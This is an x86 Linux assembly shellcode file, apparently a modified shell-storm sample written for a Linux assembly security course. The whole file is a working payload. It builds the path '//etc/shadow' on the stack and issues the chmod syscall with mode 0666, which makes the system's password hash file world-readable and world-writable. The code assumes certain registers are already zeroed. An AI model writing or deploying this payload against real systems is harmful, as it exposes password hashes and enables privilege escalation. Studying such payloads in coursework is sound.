; source http://shell-storm.org/shellcode/files/shellcode-566.php
; Modified by Author SLAE - 926 for SecurityTube Linux Assembly Expert course

global _start
_start:

mov al, 0x8 ; move 8 into al register
mov bl, 0x2 ; move 2 into bl register
mul bl ; multiply al and bl and store in ax register
dec al ; al now contains 0xf
cdq
push ecx ; null terminate
push word 0x776f; wo
push word 0x6461 ; da
push dword 0x68732f63 ; hs/c
push word 0x7465 ; te
push word 0x2f2f ; //
mov ebx, esp
mov cx, 0666o
int 0x80

